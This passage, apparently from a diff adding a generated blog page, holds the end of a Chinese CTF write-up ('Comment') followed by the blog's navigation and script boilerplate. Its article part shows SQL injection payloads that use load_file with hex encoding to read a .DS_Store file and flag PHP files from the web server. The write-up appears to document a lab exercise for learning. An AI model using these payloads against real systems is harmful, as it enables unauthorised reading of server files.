+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;,<span class="hljs-built_in">content</span>=hex(load_file(<span class="hljs-string">&quot;/tmp/html/.DS_Store&quot;</span>)),<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure>
+
+<p>这里使用hex编码，防止不可见字符，然后转为字符串：</p>
+<p><img src="https://s2.loli.net/2023/05/14/X2Zbgrxp83BFPYq.png" srcset="/img/loading.gif" lazyload alt="image-20230514135523267"></p>
+<p>发现php文件，读取：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;,<span class="hljs-built_in">content</span>=hex(load_file(<span class="hljs-string">&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;</span>)),<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure>
+
+<p>是个假的，读<code>/var/www/html</code>目录下的：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;,<span class="hljs-built_in">content</span>=hex(load_file(<span class="hljs-string">&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;</span>)),<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Comment/" class="print-no-link">#Comment</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Comment</div>
+      <div>https://leekosss.github.io/2023/08/24/Comment/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年6月5日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/ctfhub_SSRF%E6%BC%8F%E6%B4%9E/" title="ctfhub_SSRF漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ctfhub_SSRF漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/create_function()%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="create_function()命令执行">
+                        <span class="hidden-mobile">create_function()命令执行</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
